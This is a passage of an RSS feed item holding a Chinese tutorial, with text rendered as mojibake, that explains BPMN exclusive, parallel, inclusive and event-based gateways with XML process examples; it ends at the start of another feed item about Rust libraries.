      <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>${amount <span class="hljs-symbol">&amp;amp;</span>lt; 1000}<span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1g0kati"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ ¸äººC"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0xb14rh<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_17yxqht<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0xb14rh"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1g0kati"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>${amount <span class="hljs-symbol">&amp;amp;</span>gt;= 1000}<span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Event_00bedoo"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ç»“æŸ"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0guuy54<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_17yxqht<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">endEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0guuy54"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1ugsmv9"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Event_00bedoo"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_17yxqht"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1g0kati"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Event_00bedoo"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">process</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">2.å¹¶è¡Œç½‘å…³ï¼ˆParallel Gatewayï¼‰</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/356e1174e93a4113be4d037e32e637fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6I-c6bihcHM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598307&amp;x-signature=SzYwQ%2BPOABEQmqNZ%2FVDTg8jmHu8%3D" alt="image.png" loading="lazy"/></p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å…ˆåˆ†å‰å†ç›¸èšï¼Œæ‰€æœ‰è·¯çº¿ä¸€èµ·èµ°ï¼Œæœ€åç­‰å¾…å…¨éƒ¨åˆ°é½å†å¾€åèµ°ã€‚</p>
<p>ps:ä¸æ˜¯è¯´ä¸€å®šè¦æœ‰ä¸€ä¸ªåˆ†å‰å’Œèšåˆå¾—å¹¶è¡Œç½‘å…³ï¼Œä½†æ˜¯æ›´æ¨èè¿™æ ·ã€‚</p>
<p><strong>å¹¶è¡Œç½‘å…³æœºåˆ¶</strong>ï¼šå†…ç½®è®¡æ•°å™¨ï¼Œç­‰æ‰€æœ‰åˆ†æ”¯éƒ½åˆ°è¾¾æ‰æ”¾è¡Œä¸€æ¬¡ã€‚</p>
<p>ä¸‹é¢åˆ†å‡ ç§æƒ…å†µåˆ†æï¼š</p>
<p><strong>ä¸ç”¨ç½‘å…³</strong>ï¼Œæ±‡èšç‚¹æ˜¯ä»»åŠ¡èŠ‚ç‚¹ï¼Œä¼šæ‰§è¡Œå¤šæ¬¡ï¼ŒæŒ‰ç…§å…ˆåé¡ºåºã€‚</p>
<p><strong>æ’æ–¥ç½‘å…³</strong>ï¼Œæ— è®¡æ•°å™¨ï¼Œæ¯æ¡åˆ†æ”¯åˆ°è¾¾éƒ½åˆ¤æ–­æ¡ä»¶ï¼Œæ»¡è¶³å³æ”¾è¡Œ â†’ åç»­å¯èƒ½æ‰§è¡Œå¤šæ¬¡ã€‚</p>
<p>å”¯ä¸€å¯ç”¨åœºæ™¯ï¼šåç»­èŠ‚ç‚¹æ˜¯æ— çŠ¶æ€é€šçŸ¥ï¼ˆå‘é‚®ä»¶ã€å‘çŸ­ä¿¡ï¼‰ï¼Œé‡å¤æ‰§è¡Œæ— å½±å“ã€‚</p>
<p><strong>åŒ…å®¹ç½‘å…³</strong>ï¼Œå†…ç½®æ´»è·ƒåˆ†æ”¯è®¡æ•°å™¨ï¼Œç­‰æ‰€æœ‰æ´»è·ƒåˆ†æ”¯åˆ°è¾¾æ‰æ”¾è¡Œä¸€æ¬¡ï¼Œå¯æ¨¡æ‹Ÿå¹¶è¡Œç½‘å…³ã€‚ä½† æ€§èƒ½ç•¥å·®ï¼ˆåŒ…å®¹ç½‘å…³è®¡ç®—æ›´å¤æ‚ï¼‰ï¼Œæ— å®é™…æ”¶ç›Šã€‚</p>
<p><strong>äº‹ä»¶ç½‘å…³</strong>,åªèƒ½èšåˆæ•è·äº‹ä»¶ï¼Œè°å…ˆåˆ°è°èµ°ï¼Œå…¶ä»–äº‹ä»¶è‡ªåŠ¨å¤±æ•ˆã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šB å’Œ C è°å…ˆå®Œæˆï¼Œå°±èµ°è°çš„åç»­é€»è¾‘ï¼Œäº’æ–¥ï¼Œä¸æ±‡æ€»ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œæœ€å¥½è¿˜æ˜¯æŒ‰ç…§è§„èŒƒæ¥ï¼Œè¿™æ ·æ‰æ˜¯æœ€å¥½çš„å®ç°æ–¹æ¡ˆã€‚</p>
<p>ä¾‹å­ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">process</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow_fxbn4kjb"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"flow_mdrr27se"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">startEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"start_event"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å¼€å§‹"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0dso2ii<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">startEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ‰¹äººA"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0dso2ii<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_1h46vbf<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0dso2ii"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"start_event"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1h46vbf"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1ugsmv9"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ ¸äººB"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_09abes7<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_1xq7lef<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_09abes7"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1ugsmv9"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1g0kati"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ ¸äººC"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0xb14rh<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_1yb8tzu<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0xb14rh"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1g0kati"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parallelGateway</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å¹¶è¡Œç½‘å…³ï¼ˆåˆ†å‰ï¼‰"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_1h46vbf<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_09abes7<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0xb14rh<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parallelGateway</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusiveGateway</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Gateway_0rgnps9"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å¹¶è¡Œç½‘å…³ï¼ˆèšåˆï¼‰"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_1xq7lef<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_1yb8tzu<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0ue04bt<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusiveGateway</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1xq7lef"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1ugsmv9"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Gateway_0rgnps9"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1yb8tzu"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1g0kati"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Gateway_0rgnps9"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1bmja5f"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ‰¹äººD"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0ue04bt<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_1mgv6yk<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0ue04bt"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Gateway_0rgnps9"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1bmja5f"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Event_10q405i"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ç»“æŸ"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_1mgv6yk<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">endEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1mgv6yk"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1bmja5f"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Event_10q405i"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">process</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">3.åŒ…å®¹ç½‘å…³ï¼ˆInclusive Gatewayï¼‰</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96b9157805c048f693db26f0be9d9f0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6I-c6bihcHM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598307&amp;x-signature=Y37Oa604P58AAB34FIOuCN%2B3e5s%3D" alt="image.png" loading="lazy"/></p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç¬¦åˆæ¡ä»¶çš„éƒ½ä¸€èµ·èµ°ï¼Œæœ€åç­‰å¾…æ‰€æœ‰æ´»è·ƒåˆ†æ”¯èšåˆå†å¾€åèµ°ã€‚</p>
<p>psï¼šèšåˆç½‘å…³ä¼šè‡ªåŠ¨ç»Ÿè®¡å®é™…èµ°äº†å‡ æ¡ï¼Œæ— éœ€æ‰‹åŠ¨ç»´æŠ¤è®¡æ•°å™¨ã€‚</p>
<p><strong>éƒ¨åˆ†ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-&lt;process" lang="&lt;process">    &lt;startEvent id="start_event" name="å¼€å§‹"&gt;
      &lt;outgoing&gt;Flow_1v1pr17&lt;/outgoing&gt;
    &lt;/startEvent&gt;
    &lt;userTask id="Activity_0u17ax3" name="A"&gt;
      &lt;incoming&gt;Flow_1v1pr17&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_1t6ea6k&lt;/outgoing&gt;
    &lt;/userTask&gt;
    &lt;sequenceFlow id="Flow_1v1pr17" sourceRef="start_event" targetRef="Activity_0u17ax3" /&gt;
    &lt;sequenceFlow id="Flow_1t6ea6k" sourceRef="Activity_0u17ax3" targetRef="Gateway_0dxg1cd" /&gt;
    &lt;inclusiveGateway id="Gateway_0dxg1cd" name="åŒ…å®¹ç½‘å…³ï¼ˆåˆ†å‰ï¼‰"&gt;
      &lt;incoming&gt;Flow_1t6ea6k&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_1bg6ule&lt;/outgoing&gt;
      &lt;outgoing&gt;Flow_1fu8vbk&lt;/outgoing&gt;
      &lt;outgoing&gt;Flow_1rtdmr0&lt;/outgoing&gt;
    &lt;/inclusiveGateway&gt;
    &lt;userTask id="Activity_0pk0yx4" name="B"&gt;
      &lt;incoming&gt;Flow_1bg6ule&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_03pazic&lt;/outgoing&gt;
    &lt;/userTask&gt;
    &lt;sequenceFlow id="Flow_1bg6ule" sourceRef="Gateway_0dxg1cd" targetRef="Activity_0pk0yx4"&gt;
      &lt;conditionExpression xsi:type="tFormalExpression"&gt;${num &amp;amp;gt; 100}&lt;/conditionExpression&gt;
    &lt;/sequenceFlow&gt;
    &lt;userTask id="Activity_11j4upm" name="C"&gt;
      &lt;incoming&gt;Flow_1fu8vbk&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_1wa18oz&lt;/outgoing&gt;
    &lt;/userTask&gt;
    &lt;sequenceFlow id="Flow_1fu8vbk" sourceRef="Gateway_0dxg1cd" targetRef="Activity_11j4upm"&gt;
      &lt;conditionExpression xsi:type="tFormalExpression"&gt;${num &amp;amp;le; 0}&lt;/conditionExpression&gt;
    &lt;/sequenceFlow&gt;
    &lt;userTask id="Activity_0578vsx" name="D"&gt;
      &lt;incoming&gt;Flow_1rtdmr0&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_03k6sdm&lt;/outgoing&gt;
    &lt;/userTask&gt;
    &lt;sequenceFlow id="Flow_1rtdmr0" sourceRef="Gateway_0dxg1cd" targetRef="Activity_0578vsx"&gt;
      &lt;conditionExpression xsi:type="tFormalExpression"&gt;${num &amp;amp;lt; 100}&lt;/conditionExpression&gt;
    &lt;/sequenceFlow&gt;
    &lt;sequenceFlow id="Flow_1wa18oz" sourceRef="Activity_11j4upm" targetRef="Gateway_05le2zp" /&gt;
    &lt;inclusiveGateway id="Gateway_05le2zp" name="åŒ…å®¹ç½‘å…³ï¼ˆèšåˆï¼‰"&gt;
      &lt;incoming&gt;Flow_1wa18oz&lt;/incoming&gt;
      &lt;incoming&gt;Flow_03pazic&lt;/incoming&gt;
      &lt;incoming&gt;Flow_03k6sdm&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_1i51oo7&lt;/outgoing&gt;
    &lt;/inclusiveGateway&gt;
    &lt;sequenceFlow id="Flow_03pazic" sourceRef="Activity_0pk0yx4" targetRef="Gateway_05le2zp" /&gt;
    &lt;sequenceFlow id="Flow_03k6sdm" sourceRef="Activity_0578vsx" targetRef="Gateway_05le2zp" /&gt;
    &lt;userTask id="Activity_0jpa4wc" name="E"&gt;
      &lt;incoming&gt;Flow_1i51oo7&lt;/incoming&gt;
      &lt;outgoing&gt;Flow_1wtf8oo&lt;/outgoing&gt;
    &lt;/userTask&gt;
    &lt;sequenceFlow id="Flow_1i51oo7" sourceRef="Gateway_05le2zp" targetRef="Activity_0jpa4wc" /&gt;
    &lt;endEvent id="Event_1eisxie" name="ç»“æŸ"&gt;
      &lt;incoming&gt;Flow_1wtf8oo&lt;/incoming&gt;
    &lt;/endEvent&gt;
    &lt;sequenceFlow id="Flow_1wtf8oo" sourceRef="Activity_0jpa4wc" targetRef="Event_1eisxie" /&gt;
  &lt;/process&gt;
</code></pre>
<h2 data-id="heading-3">4.äº‹ä»¶ç½‘å…³ï¼ˆEvent-Based Gatewayï¼‰</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ff58ee5eb7840209825a8b65b6154d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6I-c6bihcHM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598307&amp;x-signature=e7pVqSBVNp4KM%2BXrjVv9Mhpwv%2Fk%3D" alt="image.png" loading="lazy"/></p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è°å…ˆå‘ç”Ÿå°±è°ç”Ÿæ•ˆï¼Œå…¶ä»–äº‹ä»¶ä¸ç”Ÿæ•ˆã€‚</p>
<p><strong>æ³¨æ„:</strong></p>
<p>A äº‹ä»¶ç½‘å…³ååªèƒ½è·Ÿæ•è·äº‹ä»¶ï¼ˆï¼‰</p>
<p>B ä¸€æ—¦æŸä¸ªäº‹ä»¶è§¦å‘ï¼Œå…¶ä»–äº‹ä»¶è‡ªåŠ¨å¤±æ•ˆ</p>
<p>C ä¸èƒ½ä¸ userTask ç›´è¿ã€‚</p>
<p><strong>éƒ¨åˆ†ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">process</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"orderPayment"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"è®¢å•æ”¯ä»˜å¤„ç†"</span> <span class="hljs-attr">isExecutable</span>=<span class="hljs-string">"true"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">startEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"start"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"start"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"apply"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 2. ç”¨æˆ·ä¸‹å• --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"apply"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"æäº¤è®¢å•"</span> <span class="hljs-attr">flowable:assignee</span>=<span class="hljs-string">"${userId}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"apply"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"eventGate"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 3. äº‹ä»¶ç½‘å…³ï¼šç­‰å¾…ç¬¬ä¸€ä¸ªå‘ç”Ÿçš„äº‹ä»¶ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">eventBasedGateway</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"eventGate"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"eventGate"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"waitPayment"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"eventGate"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"waitTimeout"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 4. æ¶ˆæ¯äº‹ä»¶ï¼šç­‰å¾…æ”¯ä»˜å›è°ƒ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">intermediateCatchEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"waitPayment"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ç­‰å¾…æ”¯ä»˜"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">messageEventDefinition</span> <span class="hljs-attr">messageRef</span>=<span class="hljs-string">"msgPaymentSuccess"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">intermediateCatchEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"waitPayment"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"confirmPayment"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">serviceTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"confirmPayment"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ç¡®è®¤æ”¯ä»˜æˆåŠŸ"</span>
                 <span class="hljs-attr">flowable:delegateExpression</span>=<span class="hljs-string">"${confirmPaymentDelegate}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"confirmPayment"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"end1"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"end1"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 5. å®šæ—¶å™¨äº‹ä»¶ï¼š30åˆ†é’Ÿè¶…æ—¶ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">intermediateCatchEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"waitTimeout"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"30åˆ†é’Ÿè¶…æ—¶"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">timerEventDefinition</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">timeDuration</span>&gt;</span>PT30M<span class="hljs-tag">&lt;/<span class="hljs-name">timeDuration</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">timerEventDefinition</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">intermediateCatchEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"waitTimeout"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"autoCancel"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">serviceTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"autoCancel"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"è‡ªåŠ¨å–æ¶ˆè®¢å•"</span>
                 <span class="hljs-attr">flowable:delegateExpression</span>=<span class="hljs-string">"${cancelOrderDelegate}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"autoCancel"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"end2"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"end2"</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">process</span>&gt;</span>
</code></pre>
<h2 data-id="heading-4">5.å°ç»“</h2>
<p>æ’ä»– = if-else</p>
<p>å¹¶è¡Œ = fork-join</p>
<p>åŒ…å®¹ = if-else ä¸” å¯ä»¥å¤šæ¡ true</p>
<p>äº‹ä»¶ = ç­‰è°å…ˆå‘ç”Ÿï¼ˆåªèƒ½è¿æ•è·ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[7ä¸ªæ„å»ºé«˜æ€§èƒ½åç«¯çš„ Rust å¿…å¤‡åº“]]></title>    <link>https://juejin.cn/post/7589159665839456299</link>    <guid>https://juejin.cn/post/7589159665839456299</guid>    <pubDate>2025-12-29T07:43:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665839456299" data-draft-id="7589126217234497542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="7ä¸ªæ„å»ºé«˜æ€§èƒ½åç«¯çš„ Rust å¿…å¤‡åº“"/> <meta 